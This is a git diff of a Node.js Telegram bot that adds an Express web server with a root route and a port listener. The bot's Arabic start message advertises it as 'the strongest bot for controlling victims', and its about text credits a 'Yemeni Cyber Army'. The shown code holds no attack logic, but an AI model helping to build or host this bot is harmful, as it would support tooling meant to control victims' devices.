@@ -1,11 +1,13 @@
 import TelegramBot from 'node-telegram-bot-api';
 import fs from 'fs';
+import express from 'express';
 
 const config = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
 const TOKEN = config.token;
 const DEVELOPER_ID = config.developerId;
 
 const bot = new TelegramBot(TOKEN, { polling: true });
+const app = express();
 
 const startMessage = `<b>✯ اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 1 ✯</b>
 
@@ -19,6 +21,10 @@ const aboutMessage = `<b>✯ نحن الجيش اليمني السيبراني �
 
 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @V2P_1
 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 → https://t.me/S7_MX3`;
+
+app.get('/', (req, res) => {
+  res.send('تم رفع الخادم معا تحيات المطور • 𓆩𖡡𓏺𐏓َِ ч є х σ 𓏺𖡡𓆪 •');
+});
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
@@ -53,4 +59,7 @@ bot.on('message', (msg) => {
   }
 });
 
-console.log('JEXO BOT RUNNING');
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`JEXO BOT RUNNING ON PORT ${PORT}`);
+});
